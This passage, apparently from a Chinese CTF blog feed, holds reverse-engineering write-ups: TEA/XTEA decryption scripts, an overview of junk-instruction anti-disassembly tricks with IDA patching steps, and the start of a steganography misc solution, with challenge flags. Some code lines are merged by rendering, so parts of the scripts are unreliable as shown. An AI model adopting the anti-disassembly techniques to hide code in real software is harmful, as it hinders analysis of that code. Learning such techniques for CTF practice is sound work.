class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这段代码是一个TEA变种加密实现，对32字节输入分组加密。</li><li>核心：32轮Feistel运算，密钥 <code>&#123;1,2,3,4&#125;</code>，<code>delta=0xd33b470</code>。</li></ul><p>根据提示，当输入正确的flag时，会输出<code>0x17, 0x65, 0x54, 0x89, 0xed, 0x65, 0x46, 0x32, 0x3d, 0x58, 0xa9, 0xfd, 0xe2, 0x5e, 0x61, 0x97, 0xe4, 0x60, 0xf1, 0x91, 0x73, 0xe9, 0xe9, 0xa2, 0x59, 0xcb, 0x9a, 0x99, 0xec, 0xb1, 0xe1, 0x7d</code></p><p>输入的 flag被分为4组，每组8字节</p><ul><li><code>sum</code> 初始值为 <code>delta * 32</code>（因为加密时 <code>sum</code> 累加了32次 <code>delta</code>）。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xd33b470</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">32</span>; <span class="comment">// 加密时的最终sum值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    <span class="comment">// 给定的密文（按小端序组合成uint32_t）</span></span><br><span class="line">    <span class="type">uint8_t</span> cipher[<span class="number">32</span>] = &#123;</span><br><span class="line">        <span class="number">0x17</span>, <span class="number">0x65</span>, <span class="number">0x54</span>, <span class="number">0x89</span>, <span class="number">0xed</span>, <span class="number">0x65</span>, <span class="number">0x46</span>, <span class="number">0x32</span>, </span><br><span class="line">        <span class="number">0x3d</span>, <span class="number">0x58</span>, <span class="number">0xa9</span>, <span class="number">0xfd</span>, <span class="number">0xe2</span>, <span class="number">0x5e</span>, <span class="number">0x61</span>, <span class="number">0x97</span>, </span><br><span class="line">        <span class="number">0xe4</span>, <span class="number">0x60</span>, <span class="number">0xf1</span>, <span class="number">0x91</span>, <span class="number">0x73</span>, <span class="number">0xe9</span>, <span class="number">0xe9</span>, <span class="number">0xa2</span>, </span><br><span class="line">        <span class="number">0x59</span>, <span class="number">0xcb</span>, <span class="number">0x9a</span>, <span class="number">0x99</span>, <span class="number">0xec</span>, <span class="number">0xb1</span>, <span class="number">0xe1</span>, <span class="number">0x7d</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每组8字节解密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="comment">// 将小端序的密文转换为uint32_t</span></span><br><span class="line">        <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123;</span><br><span class="line">            *(<span class="type">uint32_t</span>*)&amp;cipher[i],</span><br><span class="line">            *(<span class="type">uint32_t</span>*)&amp;cipher[i<span class="number">+4</span>]</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">decrypt</span>(v, k);</span><br><span class="line">        <span class="comment">// 输出解密后的明文（按小端序）</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (v[j] &gt;&gt; (k * <span class="number">8</span>)) &amp; <span class="number">0xff</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行得到flag<code>moectf&#123;Th3_TEA_!S_s0_t4s7y~~!!!&#125;</code></p><h2 id="HNCTF-2022-WEEK2-TTTTTTTTTea"><a href="#HNCTF-2022-WEEK2-TTTTTTTTTea" class="headerlink" title="[HNCTF 2022 WEEK2]TTTTTTTTTea"></a>[HNCTF 2022 WEEK2]TTTTTTTTTea</h2><p>先查壳</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YTlkYTJhODY0YjJmZjlkNjJiZGE4ZDEyYmIyNDEyYjZfNGtMY0lHaG5GT3ZPb3FuV1JWdWJleXJQdUx2aThRNHdfVG9rZW46UDVmRWJPTmdRbzNVQUl4Y2l1bGNIS1UxbmJiXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>我们先查一下关键字</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDY0OWM1MGE0YTA3NWMxOTVjZGMyYmJlYmU3YmMzMmZfb1hnYWNNd2E1MzNwN1BsNFp2U3N6eWlLRzVCYVMwTFpfVG9rZW46TWZseGJoMTFpb1N0anR4WFh4SGNseENxbjJiXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>这个可能是我们需要的，跟进，查看交叉引用</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDU2N2ZiYjdmYTBjMjY3ZThlNGIzYThjY2JhYWExODNfZmhlWmZnTDgwZTRsdmpuZ1V3b1dpSWczWkJMbzdVVDZfVG9rZW46T3ZVZWIwVW1nb2g0UXJ4MzlBcWNhNjg5bmNjXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>F5</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc1MDA2NzRmMzIzNWUwNTcwMTYyMDgwMTc4MjE0ZWRfeEVrQzdUYWx0dmZrS1czQnN1TFUyQXNpNTM5YWZyWGhfVG9rZW46WVNjQWJ1b015b201Mmp4czFIMWNXZnpibmViXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGYwM2M0ZWNhMWI2OTZjYzBjY2M2Yjc0OTgzMTFlMzJfQTd4ZVMySWFkdHR0ZWs5VzlHRnJVUkNGUjFLZkZUck9fVG9rZW46SGNwbmJ3aTlqb1BJcDZ4Zllxd2NKVUVzbmVlXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>跟进&amp;key</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NmNhNWI4MjU1NmE1YzY1ZmRhYTBhYTY3M2EzZmZkMGRfbk1tdWl6RFI0V0dEQTlqa1BianZ6RVF4NU5jZmczWEFfVG9rZW46QnRRTGJUWTR0b3FFbjF4c1dXdmNURjFWbmo2XzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWNhZjY4YTc4YTAzMzk2OTNkZWJkMDAxYzNmYWFmZGRfcFNDTk96U1M4YWlZZ0M2OG1zbUxZNlp0dWVoVnQ1d2NfVG9rZW46TGdPamJpektHb2V4T3p4blY2amNHYnFkbk1nXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>得到key的</p><p>看到<code>tea_encrypt(&amp;v4[2 * j + 8], &amp;key);</code>，跟进一下</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTU4NGQ1MjE4Mzg5NWZlMzkwZjcyODQ0YzRmNjAxNzlfQlBjSFdjMzE2b2dHeTVyUW5EY2thZ2ZtckRBcjd4Y2ZfVG9rZW46R3p2NGJ3MXcwbzFZSFN4WGJOcmNmMDRmbm5YXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>看到主加密函数，这是一个xtea，接下来逆向，写解密脚本</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>int main()&#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> enc[<span class="number">6</span>] = &#123;<span class="number">0xC11EE75A</span>, <span class="number">0xA4AD0973</span>, <span class="number">0xF61C9018</span>, <span class="number">0x32E37BCD</span>, <span class="number">0x2DCC1F26</span>, <span class="number">0x344380CC</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;<span class="number">0x10203</span>, <span class="number">0x4050607</span>, <span class="number">0x8090A0B</span>, <span class="number">0x0C0D0E0F</span>&#125;;</span><br><span class="line">        <span class="type">int</span> i, j;</span><br><span class="line">        <span class="type">long</span> sum = <span class="number">0</span>, delta = <span class="number">0x61C88647</span>;</span><br><span class="line">    <span class="comment">// 解码for(i=0;i &lt; 6;i+=2)&#123;</span></span><br><span class="line">                sum =  <span class="number">0</span> - (<span class="number">32</span> * delta);</span><br><span class="line">                <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++) &#123;</span><br><span class="line">                        enc[i<span class="number">+1</span>] -= (((enc[i] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * enc[i])) + enc[i]) ^ (key[((sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)] + sum);</span><br><span class="line">                        sum += delta;</span><br><span class="line">                        enc[i] -= ((((enc[i<span class="number">+1</span>] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * enc[i<span class="number">+1</span>])) + enc[i<span class="number">+1</span>]) ^ key[sum &amp; <span class="number">3</span>] + sum);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 打印for (i = 0; i &lt; 6; i++)</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j&lt;=<span class="number">3</span>; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (j * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag<code>NSSCTF&#123;Tea_TEA_TeA_TEa+&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week2-re-花指令</title>
      <link href="/2025/04/28/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>/2025/04/28/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h1><p>就是脏代码</p><p>有不可执行花指令和可执行花指令</p><p>通常在ida中表现为爆红的部分，就像这次校赛中的hua</p><p>利用反汇编算法的缺陷（线性扫描算法，递归进行算法）</p><h2 id="关于构造"><a href="#关于构造" class="headerlink" title="关于构造"></a>关于构造</h2><p>通过构造必然条件或者互补条件使反汇编出错</p><h3 id="简单jmp"><a href="#简单jmp" class="headerlink" title="简单jmp"></a>简单jmp</h3><p>只能骗过线性扫描算法，ida能够正常识别</p><h3 id="多层跳转"><a href="#多层跳转" class="headerlink" title="多层跳转"></a>多层跳转</h3><p>多了几层跳转，和jum差不多</p><p>可以将花指令进行改写，让ida错误识别，达到目的</p><h3 id="jnx和jx条件跳转"><a href="#jnx和jx条件跳转" class="headerlink" title="jnx和jx条件跳转"></a>jnx和jx条件跳转</h3><p>利用jz（当 <strong>零标志位（<strong><strong>ZF</strong></strong>）为 1</strong> 时跳转）和jnz（当 <strong>零标志位（ZF）为 0</strong> 时跳转）的互补条件跳转指令代替jmp</p><p>通常在去除的过程中可以看到很明显的标志（像jz和jnz这样）分析得到jz和jnz的长度，然后全部nop掉</p><h3 id="永真（永假）条件跳转"><a href="#永真（永假）条件跳转" class="headerlink" title="永真（永假）条件跳转"></a>永真（永假）条件跳转</h3><p>这种情况下程序一定会一直执行（就是没有被ida识别出来）</p><p>ida反汇编优先反汇编false分支部分，调用某些函数返回确定值，来构造永真或永假条件</p><h3 id="call-ret构造花指令"><a href="#call-ret构造花指令" class="headerlink" title="call&amp;ret构造花指令"></a>call&amp;ret构造花指令</h3><p>利用call和ret，在函数中修改返回地址，从而跳过thunkcode到正常流程，干扰ida正常识别。</p><p>call指令：将下一条指令地址压入栈，再执行跳转。</p><p>ret指令：将保存的地址取出，跳转执行。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="NSSRound-3-Team-jump-by-jump"><a href="#NSSRound-3-Team-jump-by-jump" class="headerlink" title="[NSSRound#3 Team]jump_by_jump"></a>[NSSRound#3 Team]jump_by_jump</h3><p>反汇编进入后，在main处按U</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTgyMjJkMjViNjU4YmQxOTI3ZjQwMWNmYzA1MGM0NDVfMVE0d3ZyUU9ib280eFZkQnQyTjVUZE1uNzE3ajFjRjBfVG9rZW46Q2twTWI4d1U0b0ZUNll4MDYxc2NTNTM0bmJQXzE3NDU4NDQxMTc6MTc0NTg0NzcxN19WNA" alt="img"></p><p>再将E8改为90</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTk5NTU4ZGY0NjczYzVmMzNiNDVjMjI2YTUyNzBjZjRfMXpsTXE4OEZxaEFKb1UyaHQwTWU2VTRhb2ZFUWhNcFlfVG9rZW46QVd0bmJTd2xtb284ZjZ4cklrTmNGUHpzbmpmXzE3NDU4NDQxMTc6MTc0NTg0NzcxN19WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjc1YWQ5NzMzM2Q5YzU1NjMzYzg1NTcyZTE1OTgwZGJfMVBXclRWWU95akdobU5tWElUVFhxU0FWNGZvM2ZWVTBfVG9rZW46WHhtdGJTaEs2bzZBR3V4UnVjRmM4WGhSbmpjXzE3NDU4NDQxMTc6MTc0NTg0NzcxN19WNA" alt="img"></p><p>再向上找到main函数</p><p>按P</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NWJhZGM5NDMyMDgwNDE5MTBjYjUwZTE1YjNhNThkOTZfQUpQNnNRUnR5UFJCTndSS1BTd1VlTG9aNUxpeDdzOFRfVG9rZW46R2h1TGJMdVdYb3NwVGR4b0FFN2NoZ1o3bktjXzE3NDU4NDQxMTc6MTc0NTg0NzcxN19WNA" alt="img"></p><p>获得flag<code>NSSCTF&#123;Jump_b9_jump!&#125;</code></p><h3 id="NSSRound-3-Team-jump-by-jump-revenge"><a href="#NSSRound-3-Team-jump-by-jump-revenge" class="headerlink" title="[NSSRound#3 Team]jump_by_jump_revenge"></a>[NSSRound#3 Team]jump_by_jump_revenge</h3><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MjMzNDdjNmJiNzIxNTNjOWVmOGMzYjAzNzBmZDdmMjVfVElva3BHTE5abGFUcGFTQlVVR1lndVRzRXBkMmk5UlNfVG9rZW46TXFMU2JHVXpib1VBb3Z4Ynl4SGNJT0NubjNiXzE3NDU4NDQxMTc6MTc0NTg0NzcxN19WNA" alt="img"></p><p>进反汇编</p><p>选中 <code>jmp near ptr 0C086A4CCh</code>，使用快捷键 D 转换为硬指令：</p><p>选中 <code>db 0E9h</code>，右键 &gt; Patching &gt; Change byte，将开头的 E9 改为 90</p><p>选中 <code>db 90h</code>，按快捷键 C 将硬指令转换为代码</p><p>在 <code>main_0</code> 函数起始处按快捷键 P，重新生成函数</p><p>解除花指令</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzMxMGUzMTQ4OWNlMDJiY2M0NGQ5ODhhZDU0ZDFlMjNfODlmWVc3dEM2VTZIYjZGUFJ3emp5WVdyQ0FvQzRsRmdfVG9rZW46T0dNcmJxRGVOb2FURFp4R0RXRGNhUXJPblM5XzE3NDU4NDQxMTc6MTc0NTg0NzcxN19WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NGRlNmZhZjQ2NzU1YzM1Nzk5MzgzNjU4MDA5YjEzMGJfWUNSdDU0eWo4ekxsVjl3MzNzNGZzVDRlZWUzNEZHSWdfVG9rZW46SzlrQmJqemIwb3FXUkh4VUgyc2NrWm5WbmtwXzE3NDU4NDQxMTc6MTc0NTg0NzcxN19WNA" alt="img"></p><p>这个时候main函数已经被成功修复</p><p>进入main_0函数后</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQ5MjFlNzVhNTcwYjQ3YTU1OTU5Zjg0NmI4NWY3OWNfUjJ5TVZYdUdpa1dZTzg4eUtoVFRiUldEanBuZnlCVG1fVG9rZW46UDV4VmJTS2c5b2UyR2t4SU5mUGNadXB6bnFmXzE3NDU4NDQxMTc6MTc0NTg0NzcxN19WNA" alt="img"></p><p>看到<code>if ( !j_strcmp(Str1, &quot;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&quot;) )</code></p><p>所以str1还原后就是flag</p><p>这个利用脚本来完成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">if</span> i &gt; (i * i + <span class="number">123</span>) % <span class="number">21</span>:</span><br><span class="line">            ascii_num = (<span class="built_in">ord</span>(cipher[i]) - <span class="number">32</span>) + j * <span class="number">96</span> - <span class="built_in">ord</span>(cipher[(i * i + <span class="number">123</span>) % <span class="number">21</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="number">32</span> &lt; ascii_num &lt; <span class="number">126</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(ascii_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ascii_num = (<span class="built_in">ord</span>(cipher[i]) - <span class="number">32</span>) + j * <span class="number">96</span> - <span class="built_in">ord</span>(flag[<span class="built_in">len</span>(cipher) - <span class="number">1</span> - ((i * i + <span class="number">123</span>) % <span class="number">21</span>)])</span><br><span class="line">            <span class="keyword">if</span> <span class="number">32</span> &lt; ascii_num &lt; <span class="number">126</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(ascii_num)</span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>运行后得到flag<code>NSSCTF&#123;Jump_b9_jump!_r3V3n9e&#125;</code></p><h3 id="GFCTF-2021-wordy"><a href="#GFCTF-2021-wordy" class="headerlink" title="[GFCTF 2021]wordy"></a>[GFCTF 2021]wordy</h3><p>打开进入反汇编</p><p>我们需要先找到如何使花指令变为正常指令</p><p>我们先随意挑选一行，右键Patch，修改前两个字节为90，有其中的一行修改后mov变成jmp，那么这个EB就是我们需要修改的地方，一个一个找太麻烦了，直接利用idapython脚本来处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x1144</span></span><br><span class="line">end = <span class="number">0x3100f</span><span class="keyword">or</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">    <span class="keyword">if</span> get_wide_byte(i) == <span class="number">0xEB</span> <span class="keyword">and</span> get_wide_byte(i + <span class="number">1</span>) == <span class="number">0xFF</span> <span class="keyword">and</span> get_wide_byte(i + <span class="number">2</span>) == <span class="number">0xC0</span>:</span><br><span class="line">        patch_byte(i, <span class="number">0x90</span>)</span><br></pre></td></tr></table></figure><p>这样就把所有的EB修改为90了</p><p>然后找到main函数，按P重新创建函数，按F5进入函数，但是我们发现运行出来不对，看到<code>You didn&#39;t find Flag</code></p><p>我们重新进入反汇编，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     dword ptr [rbp-4], 0</span><br></pre></td></tr></table></figure><p>把这一段nop掉</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDRiYjA5MjJkYjUyZTBkMmM5OTQ0MmQ5ZTE1YzQ3NzBfRGVNalo0eDhFWUU1SElvVHc3VEw3U3NBWFBOUnlMRzVfVG9rZW46R0pYeGJLelJYb2Y0aFF4MzE5R2Nsam9XbjFlXzE3NDU4NDQxMTc6MTc0NTg0NzcxN19WNA" alt="img"></p><p>最后main函数是这样的两个部分</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2FhY2EzOWM1ZjFmYjBiZjZhMmE4ZGE2ZGZmNmUzMDVfdTlGZTNhcU4zc2xLWUN2V0s1M1NqaVh0THQ2ZHNJbzFfVG9rZW46WFF0VGIxM3Frb2hpY2Z4TjJyV2NVdHI2blhmXzE3NDU4NDQxMTc6MTc0NTg0NzcxN19WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OGEzNmUyODU1YjgzMzg2ZTRlODVjOWViMzdiN2U5ZDdfdTFLOVF4TXlJMUZGNUU3dTQ4WkRvdWNhZ09ZbFE5UmhfVG9rZW46SUw5VWJXa1dLbzlaQzN4UzJENmNUWTJsbnJlXzE3NDU4NDQxMTc6MTc0NTg0NzcxN19WNA" alt="img"></p><p>当 <code>v4</code> 为真（非零）时，程序会输出 <code>G F C T F &#123; ... &#125;</code> 格式的 Flag，否则输出 <code>You didn&#39;t find Flag</code>。</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week1-re-校赛wp</title>
      <link href="/2025/04/28/week1-re-%E6%A0%A1%E8%B5%9Bwp/"/>
      <url>/2025/04/28/week1-re-%E6%A0%A1%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="baby-misc"><a href="#baby-misc" class="headerlink" title="baby_misc"></a>baby_misc</h2><p>下载压缩包打开后，其中还有一个压缩文件和一个mp3格式文件，其中的压缩文件是加密的，如下：</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDNmODgzYWQ2MzIwOTA0MTU3MWZjYWY5YjIyOTcwOTRfbEw0WGlnWm5VTThrdzg3aHZLT3lLeUhMQlNCTWQ2WkZfVG9rZW46TThCVmJzWnR1b2xyTjF4ZmRQZmNybE82blJoXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTljOTIwOTc0NTFhNDQ5NTkwN2UxNDQwMDliZjU0YjFfY1hGT3NBS016R3Q4R0FpbUJkS2ZpYzVWbkdPRU1HbnRfVG9rZW46S2QyR2JZRTB0b2Z5MjJ4anJFOWNIalk2bmtmXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>所以我们要找到这个文件的密码，由题目中的提示，如下：</p><p>可知mp3音频的密码是1111，解决音频后可能得到压缩包的密码</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTYwZDZlMWM5OTFmMzFlZTE5ZWJmYzFlMzExM2I4YzVfNG13OG9SMlZtdDRiMmxzNnlYSmhsQkZsT1hKRUEyTVJfVG9rZW46Q2FYQmJmZ1cyb2NRSE94UEROVWMwRkhmbmRjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>对于如何在MP3stego中执行解码命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decode -X -P 密码 输入.mp3</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NjVmZjBlM2IyM2JiZTNiZWNkYjBkZmQwZTdlYjY1MjJfZGFURGNDZlNNeEZzaGtSVFNFdENVZ2EwTlBmS0gybHRfVG9rZW46QmZuRmJiSUZxb3hEQXJ4aUF6aGNwQVN6blFjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTAzMWNiYmE5MjU4OGY5NDQ3OGJjNDk2MmFjMzg5MzZfb3J4bkZ1bDhjY0ptSUlyZER2dmlYWk9zWnpTazZ5OFlfVG9rZW46UlVHaWJDdVlZbzdkYnF4VlF1SmNsUjVHbjhmXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>打开后发现是压缩包，将其复制进入010，并保存</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MzhkMjA2Y2ZjZDg3MWQxNDBjYzJmZDdiZGFlYmY2Y2RfSVUwMmgxdTlSbVRadW5sU3BDQm9HcFhoWHZycFhaMmRfVG9rZW46UDEzMGIzWlVab2JHS054ZGxpTWNyVDJ0bkdaXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img 